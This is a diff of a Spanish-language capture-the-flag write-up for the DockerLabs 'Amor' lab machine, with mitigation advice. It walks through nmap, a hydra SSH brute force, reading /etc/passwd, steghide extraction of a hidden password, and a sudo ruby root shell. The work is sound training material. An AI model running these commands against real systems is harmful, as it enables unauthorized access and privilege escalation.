@@ -1,132 +1,245 @@
-# Reporte de Intrusión y Análisis de Seguridad
-## [ 1. PASO A PASO / POC (EL "CÓMO SE EXPLOTA") ]
+# DockerLabs - Amor
 
-### Fase 1: Reconocimiento y Enumeración Web
-Iniciamos comprobando que la conexión a la máquina es exitosa y luego procedemos a lanzar un escaneo con `nmap`.
+> [!abstract] Resumen
+> Máquina Linux que expone un servicio web con una lista de posibles usuarios del sistema. Mediante un ataque de fuerza bruta sobre SSH se obtiene acceso como `carlota`. La enumeración local permite identificar al usuario `oscar`, y tras aplicar esteganografía sobre una imagen en el home se obtienen sus credenciales. Finalmente, una mala configuración de `sudoers` que permite ejecutar `ruby` como `root` sin contraseña habilita la escalada total.
 
-![Escaneo NMAP](assets/Pasted%20image%2020260924194322.png)
+## Información de la Máquina
 
-Al ver los resultados, ingresamos al puerto 80 por medio de Firefox y nos muestra información de posibles usuarios del sistema.
+| Campo          | Valor      |
+| :------------- | :--------- |
+| **Plataforma** | DockerLabs |
+| **Dificultad** | Fácil      |
+| **SO**         | Linux      |
+| **IP**         | 172.17.0.2 |
 
-![Pasted image 20260924221152.png](assets/Pasted%20image%2020260924221152.png)
+---
 
->  Desglose de Comandos
-> 
-> - `nmap`: Herramienta de exploración de red y auditoría de seguridad utilizada para determinar qué puertos están abiertos en la máquina objetivo.
->     
+## Reconocimiento
 
-### Fase 2: Ataque de Fuerza Bruta y Acceso Inicial SSH
+### Escaneo de puertos
 
-Con esta información brindada en la web, ejecutamos una herramienta de fuerza bruta (`hydra`) contra el usuario `carlota` para intentar conseguir su contraseña.
+Se verificó la conectividad con el objetivo y se ejecutó `nmap` para identificar los servicios expuestos.
 
-![Pasted image 20260924195231.png](assets/Pasted%20image%2020260924195231.png)
+```bash
+nmap -sC -sV -oA nmap/initial 172.17.0.2
+```
 
-> Desglose de Comandos
-> 
-> - `hydra`: Herramienta rápida de inicio de sesión por fuerza bruta que soporta múltiples protocolos (en este caso, SSH).
->     
+![Escaneo de puertos con nmap](./img/01-nmap.png)
 
-**Resultado obtenido:**
-- `[ssh] host: 172.17.0.2 login: carlota password: babygirl`
+El único servicio relevante es el puerto 80, por lo que se procedió a inspeccionarlo desde el navegador.
 
-Ingresamos vía SSH al usuario de Carlota y procedemos a verificar a qué grupos y permisos tiene acceso.
+### Enumeración web
 
-![Pasted image 20260924195516.png](assets/Pasted%20image%2020260924195516.png)
+![Enumeración del servicio web](./img/02-web-user-enum.png)
 
-Luego procedemos a usar el comando `cat` sobre el archivo passwd para enumerar más usuarios del sistema.
-![Pasted image 20260924195545.png](assets/Pasted%20image%2020260924195545.png)
+El sitio publicaba nombres de posibles usuarios del sistema, entre ellos `carlota` y `oscar`. Esa información es directamente aprovechable para un ataque de fuerza bruta contra SSH.
 
-> Desglose de Comandos
-> 
-> - `cat`: Comando de Linux utilizado para concatenar y mostrar el contenido de archivos en la salida estándar.
->     
-> - `/etc/passwd`: Archivo del sistema que contiene la información de las cuentas de usuario registradas.
->     
+---
 
-Conseguimos identificar otro usuario en el sistema llamado `oscar`:
-`carlota:x:1001:1001::/home/carlota:/bin/sh`  
-`oscar:x:1002:1002::/home/oscar:/bin/sh`
+## Acceso Inicial
 
-----------------------------------------------------------------------------
+Con los nombres de usuario identificados, se lanzó un ataque de fuerza bruta contra el servicio SSH utilizando `hydra`.
 
-### Fase 3: Esteganografía y Extracción de Secretos
+```bash
+hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+```
 
-Indagando entre las carpetas de Carlota, entramos al directorio `Desktop`, encontramos una carpeta llamada `Vacaciones` y dentro una imagen (`imagen.jpg`), la cual analizamos en busca de metadatos o datos ocultos. Utilizando el comando `steghide info`, verificamos si contiene algo:
+![Ataque de fuerza bruta con hydra](./img/03-hydra.png)
 
-![Pasted image 20260924201908.png](assets/Pasted%20image%2020260924201908.png)
+> [!success] Credenciales obtenidas
+> ```text
+> [ssh] host: 172.17.0.2   login: carlota   password: babygirl
+> ```
 
-> Desglose de Comandos
-> 
-> - `steghide`: Herramienta de esteganografía que oculta o extrae datos confidenciales en archivos de imagen and audio.
->     
-> - `info`: Parámetro que muestra información detallada sobre el contenido oculto en el archivo portador.
->     
+Con las credenciales en mano se accedió vía SSH y se verificaron los grupos y permisos del usuario.
 
-Vemos que contiene un archivo `secret.txt`, por lo que procedemos a extraerlo utilizando `steghide`:
-`steghide extract -sf imagen.jpg`
+```bash
+ssh carlota@172.17.0.2
+id
+```
 
-![Pasted image 20260924211335.png](assets/Pasted%20image%2020260924211335.png)
+![Acceso SSH como carlota](./img/04-ssh-carlota.png)
 
-> Desglose de Comandos
-> 
-> - `extract`: Instrucción para descomprimir o extraer el archivo incrustado dentro de la imagen.
->     
-> - `-sf`: Bandera que especifica el archivo portador (_stegofile_).
->     
+---
 
-El archivo extraído nos devuelve un texto cifrado en Base64, por lo que procedemos a descifrarlo mediante una herramienta de decodificación online.
+## Enumeración Post-Explotación
 
-![Pasted image 20260924211532.png](assets/Pasted%20image%2020260924211532.png)
+Ya dentro del sistema, se enumeró el archivo `/etc/passwd` para identificar otros usuarios.
 
-Nos devolvió que la contraseña del usuario Oscar es: `eslacasadepinypon`.
+```bash
+cat /etc/passwd
+```
 
-### Fase 4: Escalada de Privilegios y Explotación con Ruby
+![Enumeración de usuarios](./img/05-passwd.png)
 
-Ahora que sabemos la contraseña de Oscar, procedemos a iniciar sesión vía SSH con sus credenciales.
-![Pasted image 20260924211825.png](assets/Pasted%20image%2020260924211825.png)
+Se identificó un segundo usuario: `oscar`. Sin sus credenciales no había forma de avanzar por ese lado, por lo que se procedió a revisar los directorios personales de `carlota`.
 
-Ejecutando los comandos que se aprecian en la imagen, confirmamos que Oscar tiene permisos para ejecutar como `root` el binario de Ruby: `User oscar may run the following commands on 564fdd50fcd5: (ALL) NOPASSWD: /usr/bin/ruby`
+> [!note]- Desglose de comandos
+> - `cat /etc/passwd`: muestra las cuentas registradas en el sistema, útil para identificar usuarios con shell válida.
 
-Ya volveremos con este dato, ya que primero revisamos los directorios en busca de alguna pista adicional.
+---
 
+## Credenciales de Oscar vía Esteganografía
 
-![Pasted image 20260924212148.png](assets/Pasted%20image%2020260924212148.png)
-Vemos que se indica que en el usuario `root` debemos ir al escritorio a revisar un archivo de texto (`.txt`). 
+Dentro de `/home/carlota/Desktop` se encontró una carpeta llamada `Vacaciones` con una imagen `imagen.jpg`. Se analizó con `steghide` en busca de contenido oculto.
 
-Volviendo a Ruby, consultamos en la plataforma GTFOBins si existía algún comando para ejecutar como superusuario y elevarnos a `root`. 
-El comando es el siguiente:
+```bash
+steghide info imagen.jpg
+```
 
-`ruby -e 'exec "/bin/sh"'`
+![Análisis con steghide info](./img/06-steghide-info.png)
 
-![Pasted image 20260924212539.png](assets/Pasted%20image%2020260924212539.png)
+La herramienta confirmó la existencia de un archivo `secret.txt` embebido. Se procedió a extraerlo.
 
-> Desglose de Comandos
-> 
-> - `ruby`: Invoca el intérprete del lenguaje de programación Ruby.
->     
-> - `-e`: Bandera que permite evaluar y ejecutar directamente una línea de código fuente pasada como argumento.
->     
-> - `'exec "/bin/sh"'`: Instrucción interna para ejecutar una shell interactiva del sistema operativo heredando los privilegios vigentes.
->     
+```bash
+steghide extract -sf imagen.jpg
+```
 
-Estando en `root`, vamos a ver el archivo de texto que se nos indicó previamente; para ello nos elevamos empleando `sudo su` y navegamos entre los directorios correspondientes.
+![Extracción del archivo oculto](./img/07-steghide-extract.png)
 
-Resultado![Pasted image 20260924212800.png](assets/Pasted%20image%2020260924212800.png)
+El archivo extraído contenía un string en Base64 que, al decodificarse, reveló la contraseña de `oscar`.
 
-Con esto podemos confirmar que llegamos al fin de la máquina de forma exitosa.
+![Decodificación Base64](./img/08-base64-decode.png)
 
-## [ 4. ANÁLISIS DE CAUSA RAÍZ Y CONCEPTOS CLAVE ]
+> [!success] Credenciales obtenidas
+> ```text
+> Usuario:  oscar
+> Password: eslacasadepinypon
+> ```
 
-La vulnerabilidad principal que permitió la elevación total de privilegios radica en una **mala configuración de las reglas de sudoers (`/etc/sudoers`)**. Otorgar permisos a un usuario sin privilegios para ejecutar un lenguaje de programación interpretado como `ruby` mediante la directiva `NOPASSWD` facilita la ejecución arbitraria de llamadas al sistema operativo con privilegios de superusuario (`root`).
+> [!note]- Desglose de comandos
+> - `steghide`: herramienta de esteganografía que permite incrustar o extraer información en imágenes y audio.
+> - `info`: subcomando que muestra si hay datos incrustados en el archivo portador.
+> - `extract -sf`: extrae el contenido oculto especificando el archivo portador.
 
-Asimismo, la filtración de nombres de usuario en servicios web expuestos y el uso de contraseñas débiles propiciaron el compromiso inicial de los sistemas.
+---
 
-## [ 5. RECOMENDACIONES Y REMEDIACIÓN ]
+## Acceso como Oscar
 
-1. **Modificar la política de sudoers:** Remover la regla que permite la ejecución de `/usr/bin/ruby` u otros binarios interactivos por parte de usuarios no privilegiados.
-    
-2. **Implementar el principio de privilegio mínimo:** Restringir estrictamente el uso de `sudo` solo a herramientas administrativas indispensables y acotadas.
-    
-3. **Fortalecer las políticas de contraseñas:** Establecer restricciones robustas de complejidad y longitud para las credenciales de los servicios SSH.
-    
-4. **Ocultación de información sensible:** Evitar la exposición de nombres de usuarios reales en servicios web públicos (puerto 80) y auditar regularmente los directorios de usuario en busca de esteganografía o datos confidenciales.
+Se reutilizaron las credenciales para acceder vía SSH.
+
+```bash
+ssh oscar@172.17.0.2
+sudo -l
+```
+
+![Acceso SSH como oscar y permisos sudo](./img/09-ssh-oscar-sudo.png)
+
+El resultado del `sudo -l` mostró una regla crítica:
+
+```text
+User oscar may run the following commands on 564fdd50fcd5:
+    (ALL) NOPASSWD: /usr/bin/ruby
+```
+
+Es decir, `oscar` puede ejecutar `ruby` como `root` sin contraseña. Antes de explotarlo, se revisaron los directorios en busca de más pistas.
+
+```bash
+ls /home/oscar
+cat /home/oscar/Desktop/nota.txt
+```
+
+![Pista encontrada](./img/10-hint-root.png)
+
+El archivo mencionaba revisar el escritorio de `root` en busca de un archivo de texto. Es decir, la flag final está en `/root/Desktop`.
+
+---
+
+## Escalada de Privilegios
+
+Consultando [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/) se identificó la técnica para abusar de `ruby` cuando se ejecuta con privilegios elevados. Ruby permite invocar una shell heredando los privilegios del proceso padre.
+
+```bash
+sudo ruby -e 'exec "/bin/sh"'
+```
+
+![Obtención de shell como root](./img/11-ruby-root.png)
+
+> [!note]- Desglose de comandos
+> - `ruby`: intérprete del lenguaje Ruby.
+> - `-e`: evalúa el código pasado como argumento.
+> - `exec "/bin/sh"`: reemplaza el proceso actual por una shell `/bin/sh`, heredando sus privilegios.
+
+---
+
+## Flag
+
+Ya como `root`, se accedió al directorio indicado por la pista para leer la flag final.
+
+```bash
+cat /root/Desktop/flag.txt
+```
+
+![Flag final obtenida](./img/12-root-flag.png)
+
+> [!example] Flag Obtenida
+> ```text
+> <flag>
+> ```
+
+---
+
+## Más Allá del Reto
+
+> [!quote] Análisis Post-Explotación
+> - **Lo que funcionó:** El ataque de fuerza bruta sobre SSH con `hydra` a partir de usuarios filtrados en la web, y el encadenamiento de `steghide` + Base64 para obtener las credenciales de `oscar`.
+> - **Lo que falló:** Nada relevante. La ruta de explotación fue lineal.
+> - **Herramientas nuevas:** `steghide` para análisis esteganográfico.
+> - **Para la próxima:** Automatizar el análisis de esteganografía sobre imágenes encontradas en directorios de usuario.
+
+---
+
+## Mitigación
+
+> [!shield] Recomendaciones Defensivas
+> Contramedidas aplicables si este escenario fuera un entorno real.
+
+### Exposición de usuarios en el servicio web
+
+**Vulnerabilidad:** El sitio público en el puerto 80 revelaba nombres de usuarios válidos del sistema, facilitando ataques dirigidos.
+
+**Mitigaciones:**
+- No publicar nombres de usuario reales en servicios expuestos a Internet.
+- Implementar autenticación multifactor para servicios críticos como SSH.
+- Limitar los intentos de autenticación con herramientas como `fail2ban` o `sshguard`.
+- Aplicar políticas de contraseñas robustas y rotación periódica.
+
+### Contraseña débil en SSH
+
+**Vulnerabilidad:** El usuario `carlota` utilizaba una contraseña presente en diccionarios comunes (`babygirl`), permitiendo un ataque de fuerza bruta exitoso.
+
+**Mitigaciones:**
+- Deshabilitar la autenticación por contraseña en SSH (`PasswordAuthentication no`) y usar exclusivamente claves públicas.
+- Forzar complejidad y longitud mínima de contraseñas mediante PAM o políticas de dominio.
+- Bloquear IPs tras N intentos fallidos.
+
+### Información sensible oculta con esteganografía
+
+**Vulnerabilidad:** Se almacenaron credenciales en un archivo oculto dentro de una imagen en el home de un usuario.
+
+**Mitigaciones:**
+- No almacenar credenciales ni secretos en archivos dentro de directorios personales.
+- Utilizar gestores de secretos (Vault, KeePass, `pass`) para credenciales sensibles.
+- Auditar periódicamente los directorios de usuario en busca de archivos sospechosos.
+
+### Configuración insegura de sudoers
+
+**Vulnerabilidad:** La regla `(ALL) NOPASSWD: /usr/bin/ruby` permitía a `oscar` ejecutar código arbitrario como `root` mediante `ruby -e`.
+
+**Mitigaciones:**
+- Remover permisos `sudo` sobre intérpretes de lenguajes (`ruby`, `python`, `perl`, `node`) y binarios interactivos (`vim`, `less`, `more`, `find`).
+- Aplicar el principio de privilegio mínimo: otorgar `sudo` solo sobre comandos específicos y con argumentos restringidos.
+- Auditar periódicamente el archivo `/etc/sudoers` y los archivos en `/etc/sudoers.d/`.
+- Consultar [GTFOBins](https://gtfobins.github.io/) antes de delegar cualquier binario vía `sudo`.
+
+> [!tip] Defensa en Profundidad
+> La combinación de controles preventivos (mínimo privilegio, sanitización), detectivos (auditoría de sudoers, `fail2ban`) y correctivos (rotación de credenciales, parcheo) es lo que realmente reduce la superficie de ataque.
+
+---
+
+## Referencias
+
+- [GTFOBins - ruby](https://gtfobins.github.io/gtfobins/ruby/)
+- [Steghide - Documentación oficial](https://steghide.sourceforge.net/documentation.php)
+- [HackTricks - Brute Force](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)
+- [OWASP - Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
